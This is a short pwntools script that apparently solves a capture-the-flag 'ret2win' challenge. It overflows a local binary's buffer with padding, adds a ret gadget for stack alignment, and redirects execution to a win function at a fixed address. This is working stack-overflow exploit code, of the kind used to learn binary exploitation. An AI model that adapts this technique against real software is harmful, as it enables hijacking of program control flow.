from pwn import *

io = process("./ret2winrars")
payload = b""
payload += b"A"*0x20 + b"B"*8
payload += p64(0x401190) # ret
payload += p64(0x401162)

io.sendlineafter("access: " ,payload)
io.interactive()
